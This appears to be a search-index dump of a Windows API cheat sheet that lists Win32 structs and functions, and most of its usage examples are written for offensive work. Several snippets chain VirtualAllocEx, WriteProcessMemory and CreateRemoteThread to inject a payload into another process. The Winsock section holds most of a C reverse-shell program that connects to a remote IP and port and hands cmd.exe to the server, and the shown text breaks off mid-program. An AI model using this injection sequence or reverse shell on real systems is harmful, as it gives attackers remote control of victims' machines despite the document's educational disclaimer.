#inluce <minwinbase.h> // Contains information used in asynchronous (also known as overlapped) input and output (I/O) operations. typedef struct _OVERLAPPED { ULONG_PTR Internal; ULONG_PTR InternalHigh; union { struct { DWORD Offset; DWORD OffsetHigh; } DUMMYSTRUCTNAME; PVOID Pointer; } DUMMYUNIONNAME; HANDLE hEvent; } OVERLAPPED, *LPOVERLAPPED; GUID #include <guiddef.h> // Represents a globally unique identifier (GUID), used to identify objects, interfaces, and other items. typedef struct _GUID { unsigned long Data1; unsigned short Data2; unsigned short Data3; unsigned char Data4[8]; } GUID; MEMORY_BASIC_INFORMATION #include <winnt.h> // Contains information about a range of pages in the virtual address space of a process. typedef struct _MEMORY_BASIC_INFORMATION { PVOID BaseAddress; PVOID AllocationBase; DWORD AllocationProtect; SIZE_T RegionSize; DWORD State; DWORD Protect; DWORD Type; } MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION; SYSTEMTIME #include <minwinbase.h> // Specifies a date and time, using individual members for the month, day, year, weekday, hour, minute, second, and millisecond. typedef struct _SYSTEMTIME { WORD wYear; WORD wMonth; WORD wDayOfWeek; WORD wDay; WORD wHour; WORD wMinute; WORD wSecond; WORD wMilliseconds; } SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME; COORD // Defines the coordinates of a character cell in a console screen buffer, where the origin (0,0) is at the top-left corner. typedef struct _COORD { SHORT X; SHORT Y; } COORD, *PCOORD; SMALL_RECT // Defines the coordinates of the upper left and lower right corners of a rectangle. typedef struct _SMALL_RECT { SHORT Left; SHORT Top; SHORT Right; SHORT Bottom; } SMALL_RECT; CONSOLE_SCREEN_BUFFER_INFO // Contains information about a console screen buffer. typedef struct _CONSOLE_SCREEN_BUFFER_INFO { COORD dwSize; COORD dwCursorPosition; WORD wAttributes; SMALL_RECT srWindow; COORD dwMaximumWindowSize; } CONSOLE_SCREEN_BUFFER_INFO, *PCONSOLE_SCREEN_BUFFER_INFO; WSADATA #include <winsock.h> // Contains information about the Windows Sockets implementation. typedef struct WSAData { WORD wVersion; WORD wHighVersion; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char FAR *lpVendorInfo; char szDescription[WSADESCRIPTION_LEN+1]; char szSystemStatus[WSASYS_STATUS_LEN+1]; } WSADATA, *LPWSADATA; CRITICAL_SECTION // Represents a critical section object, which is used to provide synchronization access to a shared resource. typedef struct _RTL_CRITICAL_SECTION { PRTL_CRITICAL_SECTION_DEBUG DebugInfo; LONG LockCount; LONG RecursionCount; HANDLE OwningThread; HANDLE LockSemaphore; ULONG_PTR SpinCount; } RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; WSAPROTOCOL_INFO #include <winsock2.h> // Contains Windows Sockets protocol information. typedef struct _WSAPROTOCOL_INFOA { DWORD dwServiceFlags1; DWORD dwServiceFlags2; DWORD dwServiceFlags3; DWORD dwServiceFlags4; DWORD dwProviderFlags; GUID ProviderId; DWORD dwCatalogEntryId; WSAPROTOCOLCHAIN ProtocolChain; int iVersion; int iAddressFamily; int iMaxSockAddr; int iMinSockAddr; int iSocketType; int iProtocol; int iProtocolMaxOffset; int iNetworkByteOrder; int iSecurityScheme; DWORD dwMessageSize; DWORD dwProviderReserved; CHAR szProtocol[WSAPROTOCOL_LEN+1]; } WSAPROTOCOL_INFOA, *LPWSAPROTOCOL_INFOA; MSGHDR #include <ws2def.h> // Contains message information for use with the `sendmsg` and `recvmsg` functions. typedef struct _WSAMSG { LPSOCKADDR name; INT namelen; LPWSABUF lpBuffers; ULONG dwBufferCount; WSABUF Control; ULONG dwFlags; } WSAMSG, *PWSAMSG, *LPWSAMSG; Win32 Sockets Structs Cheat Sheet (winsock.h) SOCKADDR // A generic socket address structure used for compatibility with various address families. typedef struct sockaddr { u_short sa_family; char sa_data[14]; } SOCKADDR, *PSOCKADDR, *LPSOCKADDR; SOCKADDR_IN // Represents an IPv4 socket address, containing the IPv4 address, port number, and address family. typedef struct sockaddr_in { short sin_family; u_short sin_port; struct in_addr sin_addr; char sin_zero[8]; } SOCKADDR_IN, *PSOCKADDR_IN, *LPSOCKADDR_IN; LINGER // Used to set the socket option SO_LINGER, which determines the action taken when unsent data is queued on a socket and a `closesocket` is performed. typedef struct linger { u_short l_onoff; u_short l_linger; } LINGER, *PLINGER, *LPLINGER; TIMEVAL // Represents a time interval, used with the `select` function to specify a timeout period. typedef struct timeval { long tv_sec; long tv_usec; } TIMEVAL, *PTIMEVAL, *LPTIMEVAL; FD_SET // Represents a set of sockets used with the `select` function to check for socket events. typedef struct fd_set { u_int fd_count; SOCKET fd_array[FD_SETSIZE]; } fd_set, *Pfd_set, *LPfd_set; Win32 Sockets Structs Cheat Sheet (winsock2.h) IN_ADDR // Represents an IPv4 address. typedef struct in_addr { union { struct { u_char s_b1, s_b2, s_b3, s_b4; } S_un_b; struct { u_short s_w1, s_w2; } S_un_w; u_long S_addr; } S_un; } IN_ADDR, *PIN_ADDR, *LPIN_ADDR; Win32 Sockets Structs Cheat Sheet (ws2def.h) ADDRINFO #include <ws2def.h> // Contains information about an address for use with the `getaddrinfo` function, and is used to build a linked list of addresses. typedef struct addrinfoW { int ai_flags; int ai_family; int ai_socktype; int ai_protocol; size_t ai_addrlen; PWSTR *ai_canonname; struct sockaddr *ai_addr; struct addrinfo *ai_next; } ADDRINFOW, *PADDRINFOW; WSABUF #include <ws2def.h> // Contains a pointer to a buffer and its length. Used for scatter/gather I/O operations. typedef struct _WSABUF { ULONG len; __field_bcount(len) CHAR FAR *buf; } WSABUF, FAR * LPWSABUF; SOCKADDR_IN6 #include <ws2ipdef.h> // Represents an IPv6 socket address, containing the IPv6 address, port number, flow info, and address family. typedef struct sockaddr_in6 { short sin6_family; u_short sin6_port; u_long sin6_flowinfo; struct in6_addr sin6_addr; u_long sin6_scope_id; } SOCKADDR_IN6, *PSOCKADDR_IN6, *LPSOCKADDR_IN6; IN6_ADDR #include <in6addr.h> // Represents an IPv6 address. typedef struct in6_addr { union { u_char Byte[16]; u_short Word[8]; } u; } IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;","title":"Windows API\u793a\u4f8b\u5927\u5168"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#table-of-contents","text":"Windows API Function Cheatsheets File Operations Process Management Memory Management Thread Management Dynamic-Link Library (DLL) Management Synchronization Interprocess Communication Windows Hooks Cryptography Debugging Winsock Registry Operations Error Handling Resource Management Unicode String Functions String Length String Copy String Concatenation String Comparison String Search Character Classification and Conversion Win32 Structs Cheat Sheet Common Structs Win32 Sockets Structs Cheat Sheet (winsock.h) Win32 Sockets Structs Cheat Sheet (winsock2.h) Win32 Sockets Structs Cheat Sheet (ws2def.h)","title":"Table of Contents"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#windows-api-function-calls","text":"","title":"Windows API Function Calls"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#file-operations","text":"CreateFile HANDLE CreateFile( LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile ); // Opens an existing file or creates a new file. ReadFile BOOL ReadFile( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped ); // Reads data from the specified file. WriteFile BOOL WriteFile( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped ); // Writes data to the specified file. CloseHandle BOOL CloseHandle( HANDLE hObject ); // Closes an open handle.","title":"File Operations"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#process-management","text":"OpenProcess HANDLE OpenProcess( [in] DWORD dwDesiredAccess, [in] BOOL bInheritHandle, [in] DWORD dwProcessId ); // Opens an existing local process object. e.g., try to open target process hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid); CreateProcess HANDLE CreateProcess( LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); // The CreateProcess function creates a new process that runs independently of the creating process. For simplicity, this relationship is called a parent-child relationship. // Start the child process // No module name (use command line), Command line, Process handle not inheritable, Thread handle not inheritable, Set handle inheritance to FALSE, No creation flags, Use parent's environment block, Use parent's starting directory, Pointer to STARTUPINFO structure, Pointer to PROCESS_INFORMATION structure CreateProcess( NULL, argv[1], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); WinExec UINT WinExec( [in] LPCSTR lpCmdLine, [in] UINT uCmdShow ); // Runs the specified application. result = WinExec(L\"C:\\\\Windows\\\\System32\\\\cmd.exe\", SW_SHOWNORMAL); TerminateProcess BOOL TerminateProcess( HANDLE hProcess, UINT uExitCode ); // Terminates the specified process. ExitWindowsEx BOOL ExitWindowsEx( [in] UINT uFlags, [in] DWORD dwReason ); // Logs off the interactive user, shuts down the system, or shuts down and restarts the system. bResult = ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_APPLICATION); CreateToolhelp32Snapshot HANDLE CreateToolhelp32Snapshot( [in] DWORD dwFlags, [in] DWORD th32ProcessID ); // used to obtain information about processes and threads running on a Windows system. Process32First BOOL Process32First( [in] HANDLE hSnapshot, [in, out] LPPROCESSENTRY32 lppe ); // used to retrieve information about the first process encountered in a system snapshot, which is typically taken using the CreateToolhelp32Snapshot function. Process32Next BOOL Process32Next( [in] HANDLE hSnapshot, [out] LPPROCESSENTRY32 lppe ); // used to retrieve information about the next process in a system snapshot after Process32First has been called. This function is typically used in a loop to enumerate all processes captured in a snapshot taken using the CreateToolhelp32Snapshot function. WriteProcessMemory BOOL WriteProcessMemory( [in] HANDLE hProcess, [in] LPVOID lpBaseAddress, [in] LPCVOID lpBuffer, [in] SIZE_T nSize, [out] SIZE_T *lpNumberOfBytesWritten ); // Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails. WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL); // pRemoteCode from VirtualAllocEx ReadProcessMemory BOOL ReadProcessMemory( [in] HANDLE hProcess, [in] LPCVOID lpBaseAddress, [out] LPVOID lpBuffer, [in] SIZE_T nSize, [out] SIZE_T *lpNumberOfBytesRead ); // ReadProcessMemory copies the data in the specified address range from the address space of the specified process into the specified buffer of the current process. bResult = ReadProcessMemory(pHandle, (void*)baseAddress, &address, sizeof(address), 0);","title":"Process Management"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#memory-management","text":"VirtualAlloc LPVOID VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, // Shellcode must be between 0x1 and 0x10000 bytes (page size) DWORD flAllocationType, // #define MEM_COMMIT 0x00001000 DWORD flProtect // #define PAGE_EXECUTE_READWRITE 0x00000040 ); // Reserves, commits, or changes the state of a region of memory within the virtual address space of the calling process. VirtualAllocEx LPVOID VirtualAllocEx( [in] HANDLE hProcess, [in, optional] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flAllocationType, [in] DWORD flProtect ); // Reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process. The function initializes the memory it allocates to zero. pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ); VirtualFree BOOL VirtualFree( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType ); // Releases, decommits, or releases and decommits a region of memory within the virtual address space of the calling process. VirtualProtect function (memoryapi.h) BOOL VirtualProtect( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ); // Changes the protection on a region of committed pages in the virtual address space of the calling process. RtlMoveMemory VOID RtlMoveMemory( _Out_ VOID UNALIGNED *Destination, _In_ const VOID UNALIGNED *Source, _In_ SIZE_T Length ); // Copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks.","title":"Memory Management"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#thread-management","text":"CreateThread HANDLE CreateThread( [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, // A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new thread and determines whether child processes can inherit the returned handle. [in] SIZE_T dwStackSize, // The initial size of the stack, in bytes. [in] LPTHREAD_START_ROUTINE lpStartAddress, // A pointer to the application-defined function of type LPTHREAD_START_ROUTINE [in, optional] __drv_aliasesMem LPVOID lpParameter, // A pointer to a variable to be passed to the thread function. [in] DWORD dwCreationFlags, // The flags that control the creation of the thread. [out, optional] LPDWORD lpThreadId // A pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned. ); // Creates a thread to execute within the virtual address space of the calling process. th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); WaitForSingleObject(th, 0); CreateRemoteThread HANDLE CreateRemoteThread( [in] HANDLE hProcess, [in] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in] LPVOID lpParameter, [in] DWORD dwCreationFlags, [out] LPDWORD lpThreadId ); // Creates a thread that runs in the virtual address space of another process. hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory CreateRemoteThreadEx HANDLE CreateRemoteThreadEx( [in] HANDLE hProcess, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in, optional] LPVOID lpParameter, [in] DWORD dwCreationFlags, [in, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, [out, optional] LPDWORD lpThreadId ); // Creates a thread that runs in the virtual address space of another process and optionally specifies extended attributes such as processor group affinity. // See InitializeProcThreadAttributeList hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, lpAttributeList, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory ExitThread VOID ExitThread( DWORD dwExitCode ); // Terminates the calling thread and returns the exit code to the operating system. GetExitCodeThread BOOL GetExitCodeThread( HANDLE hThread, LPDWORD lpExitCode ); // Retrieves the termination status of the specified thread. ResumeThread DWORD ResumeThread( HANDLE hThread ); // Decrements a thread's suspend count. When the suspend count is decremented to zero, the execution of the thread is resumed. SuspendThread DWORD SuspendThread( HANDLE hThread ); // Suspends the specified thread. TerminateThread BOOL TerminateThread( HANDLE hThread, DWORD dwExitCode ); // Terminates the specified thread. CloseHandle BOOL CloseHandle( HANDLE hObject ); // Closes an open handle.","title":"Thread Management"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#dynamic-link-library-dll-management","text":"LoadLibrary HMODULE LoadLibrary( LPCTSTR lpFileName ); // Loads a dynamic-link library (DLL) module into the address space of the calling process. LoadLibraryExA HMODULE LoadLibraryExA( [in] LPCSTR lpLibFileName, HANDLE hFile, [in] DWORD dwFlags ); // Loads the specified module into the address space of the calling process, with additional options. HMODULE hModule = LoadLibraryExA(\"ws2_32.dll\", NULL, LOAD_LIBRARY_SAFE_CURRENT_DIRS); GetProcAddress FARPROC GetProcAddress( HMODULE hModule, LPCSTR lpProcName ); // Retrieves the address of an exported function or variable from the specified DLL. pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(\"Kernel32.dll\"), \"LoadLibraryA\"); FreeLibrary BOOL FreeLibrary( HMODULE hModule ); // Frees the loaded DLL module and, if necessary, decrements its reference count.","title":"Dynamic-Link Library (DLL) Management"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#synchronization","text":"CreateMutex HANDLE CreateMutex( LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCTSTR lpName ); // Creates a named or unnamed mutex object. CreateSemaphore HANDLE CreateSemaphore( LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCTSTR lpName ); // Creates a named or unnamed semaphore object. ReleaseMutex BOOL ReleaseMutex( HANDLE hMutex ); // Releases ownership of the specified mutex object. ReleaseSemaphore BOOL ReleaseSemaphore( HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount ); // Increases the count of the specified semaphore object by a specified amount. WaitForSingleObject DWORD WaitForSingleObject( [in] HANDLE hHandle, [in] DWORD dwMilliseconds ); // Waits until the specified object is in the signaled state or the time-out interval elapses. WaitForSingleObject(hThread, 500);","title":"Synchronization"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#interprocess-communication","text":"CreatePipe BOOL CreatePipe( PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize ); // Creates an anonymous pipe and returns handles to the read and write ends of the pipe. CreateNamedPipe HANDLE CreateNamedPipe( LPCTSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes ); // Creates a named pipe and returns a handle for subsequent pipe operations. ConnectNamedPipe BOOL ConnectNamedPipe( HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped ); // Enables a named pipe server process to wait for a client process to connect to an instance of a named pipe. DisconnectNamedPipe BOOL DisconnectNamedPipe( HANDLE hNamedPipe ); // Disconnects the server end of a named pipe instance from a client process. CreateFileMapping HANDLE CreateFileMapping( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName ); // Creates or opens a named or unnamed file mapping object for a specified file. MapViewOfFile LPVOID MapViewOfFile( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap ); // Maps a view of a file mapping into the address space of the calling process. UnmapViewOfFile BOOL UnmapViewOfFile( LPCVOID lpBaseAddress ); // Unmaps a mapped view of a file from the calling process's address space. CloseHandle BOOL CloseHandle( HANDLE hObject ); // Closes an open handle.","title":"Interprocess Communication"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#windows-hooks","text":"SetWindowsHookExA HHOOK SetWindowsHookExA( [in] int idHook, [in] HOOKPROC lpfn, [in] HINSTANCE hmod, [in] DWORD dwThreadId ); // Installs an application-defined hook procedure into a hook chain. You would install a hook procedure to monitor the system for certain types of events. These events are associated either with a specific thread or with all threads in the same desktop as the calling thread. CallNextHookEx LRESULT CallNextHookEx( [in, optional] HHOOK hhk, [in] int nCode, [in] WPARAM wParam, [in] LPARAM lParam ); // Passes the hook information to the next hook procedure in the current hook chain. A hook procedure can call this function either before or after processing the hook information. UnhookWindowsHookEx BOOL UnhookWindowsHookEx( [in] HHOOK hhk ); // Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function. GetAsyncKeyState SHORT GetAsyncKeyState( [in] int vKey ); // Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState. GetKeyState SHORT GetKeyState( [in] int nVirtKey ); // Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled (on, off\u2014alternating each time the key is pressed). GetKeyboardState BOOL GetKeyboardState( [out] PBYTE lpKeyState ); // Copies the status of the 256 virtual keys to the specified buffer.","title":"Windows Hooks"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#cryptography","text":"CryptBinaryToStringA BOOL CryptBinaryToStringA( [in] const BYTE *pbBinary, [in] DWORD cbBinary, [in] DWORD dwFlags, [out, optional] LPSTR pszString, [in, out] DWORD *pcchString ); // The CryptBinaryToString function converts an array of bytes into a formatted string. CryptDecrypt BOOL CryptDecrypt( [in] HCRYPTKEY hKey, [in] HCRYPTHASH hHash, [in] BOOL Final, [in] DWORD dwFlags, [in, out] BYTE *pbData, [in, out] DWORD *pdwDataLen ); // The CryptDecrypt function decrypts data previously encrypted by using the CryptEncrypt function. CryptEncrypt BOOL CryptEncrypt( [in] HCRYPTKEY hKey, [in] HCRYPTHASH hHash, [in] BOOL Final, [in] DWORD dwFlags, [in, out] BYTE *pbData, [in, out] DWORD *pdwDataLen, [in] DWORD dwBufLen ); // The CryptEncrypt function encrypts data. The algorithm used to encrypt the data is designated by the key held by the CSP module and is referenced by the hKey parameter. CryptDecryptMessage BOOL CryptDecryptMessage( [in] PCRYPT_DECRYPT_MESSAGE_PARA pDecryptPara, [in] const BYTE *pbEncryptedBlob, [in] DWORD cbEncryptedBlob, [out, optional] BYTE *pbDecrypted, [in, out, optional] DWORD *pcbDecrypted, [out, optional] PCCERT_CONTEXT *ppXchgCert ); // The CryptDecryptMessage function decodes and decrypts a message. CryptEncryptMessage BOOL CryptEncryptMessage( [in] PCRYPT_ENCRYPT_MESSAGE_PARA pEncryptPara, [in] DWORD cRecipientCert, [in] PCCERT_CONTEXT [] rgpRecipientCert, [in] const BYTE *pbToBeEncrypted, [in] DWORD cbToBeEncrypted, [out] BYTE *pbEncryptedBlob, [in, out] DWORD *pcbEncryptedBlob ); // The CryptEncryptMessage function encrypts and encodes a message.","title":"Cryptography"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#debugging","text":"IsDebuggerPresent BOOL IsDebuggerPresent(); // Determines whether the calling process is being debugged by a user-mode debugger. CheckRemoteDebuggerPresent BOOL CheckRemoteDebuggerPresent( [in] HANDLE hProcess, [in, out] PBOOL pbDebuggerPresent ); // Determines whether the specified process is being debugged. OutputDebugStringA void OutputDebugStringA( [in, optional] LPCSTR lpOutputString ); // Sends a string to the debugger for display.","title":"Debugging"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#winsock","text":"/*** Windows Reverse Shell * * \u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2584 \u2588 \u2592\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2591 \u2584\u2588\u2588\u2588\u2588\u2584 \u2588\u2588\u2580\u2588\u2588\u2588 \u2584\u2584\u2584 \u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2591 \u2588\u2588 * \u2592\u2588\u2588 \u2592 \u2588\u2588 \u2580\u2588 \u2588 \u2592\u2588\u2588\u2592 \u2588\u2588\u2592\u2593\u2588\u2591 \u2588 \u2591\u2588\u2591\u2592\u2588\u2588\u2580 \u2580\u2588 \u2593\u2588\u2588 \u2592 \u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2584 \u2592\u2588\u2588 \u2592 \u2593\u2588\u2588\u2591 \u2588\u2588\u2592 * \u2591 \u2593\u2588\u2588\u2584 \u2593\u2588\u2588 \u2580\u2588 \u2588\u2588\u2592\u2592\u2588\u2588\u2591 \u2588\u2588\u2592\u2592\u2588\u2591 \u2588 \u2591\u2588 \u2592\u2593\u2588 \u2584 \u2593\u2588\u2588 \u2591\u2584\u2588 \u2592\u2592\u2588\u2588 \u2580\u2588\u2584 \u2591 \u2593\u2588\u2588\u2584 \u2592\u2588\u2588\u2580\u2580\u2588\u2588\u2591 * \u2592 \u2588\u2588\u2592\u2593\u2588\u2588\u2592 \u2590\u258c\u2588\u2588\u2592\u2592\u2588\u2588 \u2588\u2588\u2591\u2591\u2588\u2591 \u2588 \u2591\u2588 \u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2592\u2588\u2588\u2580\u2580\u2588\u2584 \u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 \u2592 \u2588\u2588\u2592\u2591\u2593\u2588 \u2591\u2588\u2588 * \u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2591 \u2593\u2588\u2588\u2591\u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2591\u2588\u2588\u2592\u2588\u2588\u2593 \u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592 \u2593\u2588 \u2593\u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2591\u2593\u2588\u2592\u2591\u2588\u2588\u2593 * \u2592 \u2592\u2593\u2592 \u2592 \u2591\u2591 \u2592\u2591 \u2592 \u2592 \u2591 \u2592\u2591\u2592\u2591\u2592\u2591 \u2591 \u2593\u2591\u2592 \u2592 \u2591 \u2591\u2592 \u2592 \u2591\u2591 \u2592\u2593 \u2591\u2592\u2593\u2591 \u2592\u2592 \u2593\u2592\u2588\u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591 \u2592 \u2591\u2591\u2592\u2591\u2592 * \u2591 \u2591\u2592 \u2591 \u2591\u2591 \u2591\u2591 \u2591 \u2592\u2591 \u2591 \u2592 \u2592\u2591 \u2592 \u2591 \u2591 \u2591 \u2592 \u2591\u2592 \u2591 \u2592\u2591 \u2592 \u2592\u2592 \u2591\u2591 \u2591\u2592 \u2591 \u2591 \u2592 \u2591\u2592\u2591 \u2591 * \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2592 \u2591 \u2591 \u2591 \u2591\u2591 \u2591 \u2591 \u2592 \u2591 \u2591 \u2591 \u2591 \u2591\u2591 \u2591 * \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 * Written by: snowcra5h@icloud.com (snowcra5h) 2023 * * This program establishes a reverse shell via the Winsock2 library. It is * designed to establish a connection to a specified remote server, and execute commands * received from the server on the local machine, giving the server * control over the local machine. * * Compile command (using MinGW on Wine): * wine gcc.exe windows.c -o windows.exe -lws2_32 * * This code is intended for educational and legitimate penetration testing purposes only. * Please use responsibly and ethically. * */ #include <winsock2.h> #include <ws2tcpip.h> #include <stdio.h> #include <windows.h> #include <process.h> const char* const PORT = \"1337\"; const char* const IP = \"10.37.129.2\"; typedef struct { HANDLE hPipeRead; HANDLE hPipeWrite; SOCKET sock; } ThreadParams; DWORD WINAPI OutputThreadFunc(LPVOID data); DWORD WINAPI InputThreadFunc(LPVOID data); void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock); int main(int argc, char** argv) { WSADATA wsaData; int err = WSAStartup(MAKEWORD(2, 2), &wsaData); if (err != 0) { fprintf(stderr, \"WSAStartup failed: %d\\n\", err); return 1; } SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED); if (sock == INVALID_SOCKET) { fprintf(stderr, \"Socket function failed with error = %d\\n\", WSAGetLastError()); WSACleanup(); return 1; } struct addrinfo hints = { 0 }; hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM; struct addrinfo* result; err = getaddrinfo(IP, PORT, &hints, &result); if (err != 0) { fprintf(stderr, \"Failed to get address info: %d\\n\", err); CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock); return 1; } if (WSAConnect(sock, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) == SOCKET_ERROR) { fprintf(stderr, \"Failed to connect.\\n\"); CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock); return 1; } SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE }; HANDLE hInputWrite, hOutputRead, hInputRead, hOutputWrite; if (!CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0) || !CreatePipe(&hInputRead, &hInputWrite, &sa, 0)) { fprintf(stderr, \"Failed to create pipe.\\n\"); CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock); return 1; } STARTUPINFO startupInfo = { 0 }; startupInfo.cb = sizeof(startupInfo); startupInfo.dwFlags = STARTF_USESTDHANDLES; startupInfo.hStdInput = hInputRead; startupInfo.hStdOutput = hOutputWrite; startupInfo.hStdError = hOutputWrite; PROCESS_INFORMATION processInfo; WCHAR cmd[] = L\"cmd.exe /k\"; if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) { fprintf(stderr, \"Failed to create process.\\n\"); CleanUp(hInputWrite, hInputRead, hOutputWrite, hOutputRead, processInfo, result, sock); return 1; } 